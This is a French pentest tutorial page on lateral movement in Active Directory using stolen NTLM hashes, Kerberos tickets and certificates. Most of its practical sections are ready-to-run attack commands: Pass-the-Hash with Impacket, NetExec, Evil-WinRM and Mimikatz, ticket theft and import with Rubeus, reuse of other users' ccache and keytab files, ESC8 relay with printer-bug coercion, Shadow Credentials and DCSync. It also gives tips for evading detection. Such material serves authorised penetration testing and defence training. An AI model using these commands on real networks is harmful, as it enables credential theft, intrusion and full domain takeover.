# Mouvement lateral avec les credentials

Une fois des hashs NTLM, des tickets Kerberos ou des certificats X.509 en main, on peut se deplacer lateralement dans le reseau sans jamais connaitre le mot de passe en clair. C'est le coeur du post-exploitation en environnement Active Directory.

## Pourquoi

En pentest interne, compromettre une seule machine ne suffit pas. L'objectif est de progresser dans le reseau jusqu'au Domain Admin ou aux actifs critiques. Les techniques de Pass-the-Hash, Pass-the-Ticket et Pass-the-Certificate permettent de reutiliser des credentials deja extraites pour s'authentifier sur d'autres machines, sans declencher de brute force ni casser de hash.

## Comment ca marche

### Pass-the-Hash (PtH)

Le protocole NTLM utilise le hash du mot de passe pour l'authentification, pas le mot de passe lui-meme. Comme le hash NTLM n'est pas sale, un attaquant qui le possede peut s'authentifier directement. Cette technique fonctionne tant que le mot de passe n'est pas change.

| Pre-requis | Detail |
|---|---|
| **Hash NTLM** | Extrait de la SAM, LSASS ou NTDS.dit |
| **Privileges** | Admin local sur la cible (sauf WinRM avec Remote Management Users) |
| **Protocole** | SMB, WinRM, RDP (avec Restricted Admin Mode) |

### Pass-the-Ticket (PtT)

Kerberos utilise des tickets pour l'authentification. Un TGT (Ticket Granting Ticket) permet de demander des TGS (Ticket Granting Service) pour acceder a n'importe quel service. Voler un TGT revient a usurper l'identite d'un utilisateur pour toute la duree de validite du ticket.

| Concept | Role |
|---|---|
| **TGT** | Ticket initial delivre par le KDC apres authentification |
| **TGS** | Ticket specifique a un service (CIFS, LDAP, HTTP...) |
| **KDC** | Key Distribution Center (sur le controleur de domaine) |
| **ccache / .kirbi** | Formats de stockage des tickets (Linux / Windows) |

### Pass-the-Certificate (PtC)

PKINIT est une extension de Kerberos qui permet de s'authentifier avec un certificat X.509 au lieu d'un mot de passe. Si on obtient un certificat valide (via une attaque ADCS ou Shadow Credentials), on peut demander un TGT sans connaitre aucun mot de passe ni hash.

## En pratique

### Pass-the-Hash

{% tabs %}
{% tab title="Impacket (Linux)" %}
```bash
# - PsExec avec hash NTLM (obtient un shell SYSTEM)
impacket-psexec <USER>@<IP_CIBLE> -hashes :<NTLM_HASH>

# - WMIExec (plus discret, pas d'ecriture sur disque)
impacket-wmiexec <USER>@<IP_CIBLE> -hashes :<NTLM_HASH>

# - SMBExec (via le Service Control Manager)
impacket-smbexec <USER>@<IP_CIBLE> -hashes :<NTLM_HASH>
```
{% endtab %}
{% tab title="NetExec (Linux)" %}
```bash
# - Tester un hash sur un sous-reseau entier
netexec smb 10.10.10.0/24 -u Administrator -d . -H <NTLM_HASH>
# "(Pwn3d!)" = admin local sur la cible

# - Executer une commande via PtH
netexec smb <IP_CIBLE> -u Administrator -d . -H <NTLM_HASH> -x "whoami"

# - Tester avec --local-auth pour les comptes locaux
netexec smb 10.10.10.0/24 -u Administrator -H <NTLM_HASH> --local-auth
```
{% endtab %}
{% tab title="Evil-WinRM (Linux)" %}
```bash
# - Shell PowerShell via WinRM avec PtH
evil-winrm -i <IP_CIBLE> -u <USER> -H <NTLM_HASH>

# Fonctionne meme sans privileges admin local
# si l'utilisateur est membre de Remote Management Users
```
{% endtab %}
{% tab title="Mimikatz (Windows)" %}
```cmd
# - Ouvrir un processus avec le hash d'un autre utilisateur
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAINE> /run:cmd.exe

# - Depuis le nouveau cmd, acceder aux ressources du domaine
dir \\DC01\partage
```
{% endtab %}
{% endtabs %}

#### PtH via RDP

Le PtH via RDP necessite que le Restricted Admin Mode soit active sur la cible.

```bash
# - Activer le Restricted Admin Mode (depuis un acces existant)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# - Connexion RDP avec hash
xfreerdp /v:<IP_CIBLE> /u:<USER> /pth:<NTLM_HASH>
```

{% hint style="warning" %}
**UAC et comptes locaux** : par defaut, seul le compte Administrator integre (RID 500) peut effectuer du PtH avec un compte local. Les autres comptes admin locaux sont bloques par le filtre UAC (`LocalAccountTokenFilterPolicy`). En revanche, les comptes de domaine avec des droits admin ne sont pas affectes par cette restriction.
{% endhint %}

### Pass-the-Ticket (Windows)

{% tabs %}
{% tab title="Exporter les tickets" %}
```powershell
# - Exporter tous les tickets avec Mimikatz (fichiers .kirbi)
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# - Exporter avec Rubeus (format Base64)
Rubeus.exe dump /nowrap

# Les tickets krbtgt/* sont des TGT
# Les tickets cifs/*, ldap/*, http/* sont des TGS
```
{% endtab %}
{% tab title="Importer et utiliser un ticket" %}
```powershell
# - Importer un ticket .kirbi avec Rubeus
Rubeus.exe ptt /ticket:<FICHIER>.kirbi

# - Importer un ticket Base64 avec Rubeus
Rubeus.exe ptt /ticket:<BASE64_TICKET>

# - Importer avec Mimikatz
mimikatz # kerberos::ptt "<CHEMIN>\ticket.kirbi"

# - Verifier les tickets en cache
klist

# - Acceder aux ressources
dir \\DC01.domaine.local\C$
```
{% endtab %}
{% tab title="OverPass-the-Hash" %}
```powershell
# - Forger un TGT a partir d'un hash NTLM (Mimikatz)
mimikatz # sekurlsa::pth /user:<USER> /ntlm:<HASH> /domain:<DOMAINE>

# - Forger un TGT avec la cle AES-256 (Rubeus, plus discret)
Rubeus.exe asktgt /user:<USER> /domain:<DOMAINE> /aes256:<AES_KEY> /ptt

# - Extraire les cles Kerberos avec Mimikatz
mimikatz # sekurlsa::ekeys
```

{% hint style="info" %}
Utiliser une cle AES-256 plutot qu'un hash RC4 (NTLM) evite de declencher des alertes de downgrade de chiffrement dans les environnements modernes.
{% endhint %}
{% endtab %}
{% tab title="PowerShell Remoting" %}
```powershell
# - Apres import du ticket, se connecter via PSRemoting
Enter-PSSession -ComputerName DC01

# - Ou executer une commande a distance
Invoke-Command -ComputerName DC01 -ScriptBlock { whoami; hostname }
```
{% endtab %}
{% endtabs %}

### Pass-the-Ticket (Linux)

Sur une machine Linux jointe au domaine, les tickets Kerberos sont stockes sous forme de fichiers ccache (generalement dans `/tmp`) ou de fichiers keytab.

{% tabs %}
{% tab title="Trouver des tickets" %}
```bash
# - Verifier la variable d'environnement
env | grep -i krb5
# KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh

# - Lister les fichiers ccache dans /tmp
ls -la /tmp/krb5cc_*

# - Chercher des fichiers keytab
find / -name "*keytab*" -ls 2>/dev/null

# - Verifier les crontabs pour des scripts utilisant kinit
crontab -l
cat /home/*/.scripts/*.sh 2>/dev/null | grep kinit

# - Verifier si la machine est jointe au domaine
realm list
ps -ef | grep -i "winbind\|sssd"
```
{% endtab %}
{% tab title="Utiliser un keytab" %}
```bash
# - Lister les principaux dans un keytab
klist -k -t /opt/specialfiles/user.keytab

# - S'authentifier avec un keytab
kinit <USER>@<DOMAINE> -k -t /chemin/vers/fichier.keytab

# - Verifier le ticket obtenu
klist

# - Acceder a un partage SMB avec le ticket
smbclient //dc01.domaine.local/partage -k -no-pass
```
{% endtab %}
{% tab title="Utiliser un ccache" %}
```bash
# - Utiliser le ccache d'un autre utilisateur (necessite root)
export KRB5CCNAME=/tmp/krb5cc_<UID>_<SUFFIXE>

# - Verifier l'identite
klist

# - Acceder aux ressources avec le ticket vole
smbclient //dc01.domaine.local/partage -k -no-pass
impacket-psexec -k -no-pass <DOMAINE>/<USER>@dc01.domaine.local
```
{% endtab %}
{% tab title="Conversion de formats" %}
```bash
# - Convertir un .kirbi (Windows) en .ccache (Linux)
impacket-ticketConverter ticket.kirbi ticket.ccache

# - Convertir un .ccache en .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi

# - Utiliser le ticket converti
export KRB5CCNAME=/chemin/vers/ticket.ccache
```
{% endtab %}
{% endtabs %}

### Pass-the-Certificate

{% tabs %}
{% tab title="ESC8 (NTLM Relay vers ADCS)" %}
```bash
# - Lancer ntlmrelayx vers le service de web enrollment ADCS
impacket-ntlmrelayx -t http://<IP_CA>/certsrv/certfnsh.asp \
  --adcs -smb2support --template KerberosAuthentication

# - Forcer l'authentification d'un DC (printer bug)
python3 printerbug.py <DOMAINE>/<USER>:<PASSWORD>@<IP_DC> <IP_ATTAQUANT>

# - ntlmrelayx obtient un certificat PFX pour le compte machine du DC
# Writing PKCS#12 certificate to ./DC01$.pfx
```
{% endtab %}
{% tab title="Shadow Credentials" %}
```bash
# - Ajouter une cle publique sur l'attribut msDS-KeyCredentialLink
pywhisker --dc-ip <IP_DC> -d <DOMAINE> \
  -u <USER_CONTROLEUR> -p '<PASSWORD>' \
  --target <USER_CIBLE> --action add

# - Resultat : un fichier PFX et un mot de passe
# Saved PFX (#PKCS12) certificate & key at path: <fichier>.pfx
# Must be used with password: <mot_de_passe>
```
{% endtab %}
{% tab title="Obtenir un TGT avec le certificat" %}
```bash
# - Utiliser gettgtpkinit.py pour obtenir un TGT
python3 gettgtpkinit.py -cert-pfx <FICHIER>.pfx \
  -dc-ip <IP_DC> '<DOMAINE>/<COMPTE>' /tmp/ticket.ccache

# - Si le certificat est protege par mot de passe
python3 gettgtpkinit.py -cert-pfx <FICHIER>.pfx \
  -pfx-pass '<MOT_DE_PASSE>' -dc-ip <IP_DC> \
  '<DOMAINE>/<COMPTE>' /tmp/ticket.ccache

# - Exporter et utiliser le ticket
export KRB5CCNAME=/tmp/ticket.ccache

# - DCSync si le certificat est celui d'un compte machine DC
impacket-secretsdump -k -no-pass -dc-ip <IP_DC> \
  -just-dc-user Administrator '<DOMAINE>/<DC$>'@dc01.<DOMAINE>
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Un certificat obtenu via ESC8 pour le compte machine d'un controleur de domaine donne un acces DCSync, ce qui equivaut a la compromission totale du domaine. C'est l'une des attaques les plus critiques en environnement AD.
{% endhint %}

## Pieges et galeres

- **UAC et PtH** : le filtre UAC bloque le PtH pour les comptes admin locaux (sauf RID 500). Verifier `LocalAccountTokenFilterPolicy` avant de conclure qu'un hash est inutile
- **Restricted Admin Mode** : le PtH via RDP echoue si `DisableRestrictedAdmin` n'est pas a 0. Il faut un acces existant pour modifier cette cle de registre
- **Duree de vie des tickets** : les TGT Kerberos expirent (generalement 10h). Un ticket vole est utilisable uniquement pendant cette fenetre
- **Downgrade detection** : utiliser un hash RC4 (NTLM) pour forger un ticket dans un environnement AES-256 genere des evenements de securite. Preferer les cles AES quand elles sont disponibles
- **Keytab et changement de mot de passe** : les fichiers keytab deviennent inutilisables apres un changement de mot de passe
- **krb5.conf** : sur Linux, l'authentification Kerberos necessite un `/etc/krb5.conf` correctement configure avec le realm et le KDC

## Retour terrain

Le PtH reste la technique de mouvement lateral la plus fiable en environnement Windows. En pratique, on recupre un hash admin local via la SAM d'une machine compromise, puis on teste ce hash sur tout le sous-reseau avec NetExec. La reutilisation du mot de passe admin local est extremement courante dans les organisations qui n'utilisent pas LAPS. Pour le PtT, c'est souvent le vol d'un TGT dans LSASS qui donne les meilleurs resultats, surtout quand un admin de domaine a une session active sur une machine compromise.

## Memo express

| Commande | Usage |
|---|---|
| `impacket-psexec <USER>@<IP> -hashes :<HASH>` | PtH avec PsExec |
| `netexec smb <IP> -u <USER> -H <HASH>` | PtH avec NetExec |
| `evil-winrm -i <IP> -u <USER> -H <HASH>` | PtH avec Evil-WinRM |
| `xfreerdp /v:<IP> /u:<USER> /pth:<HASH>` | PtH via RDP |
| `mimikatz # sekurlsa::pth /user: /rc4: /domain:` | PtH avec Mimikatz |
| `Rubeus.exe dump /nowrap` | Exporter les tickets (Base64) |
| `Rubeus.exe ptt /ticket:<TICKET>` | Importer un ticket |
| `Rubeus.exe asktgt /user: /aes256: /ptt` | OverPass-the-Hash |
| `export KRB5CCNAME=/tmp/ticket.ccache` | Utiliser un ticket Linux |
| `impacket-ticketConverter` | Convertir .kirbi / .ccache |
| `pywhisker --target <USER> --action add` | Shadow Credentials |
| `python3 gettgtpkinit.py -cert-pfx cert.pfx` | TGT via certificat |

***
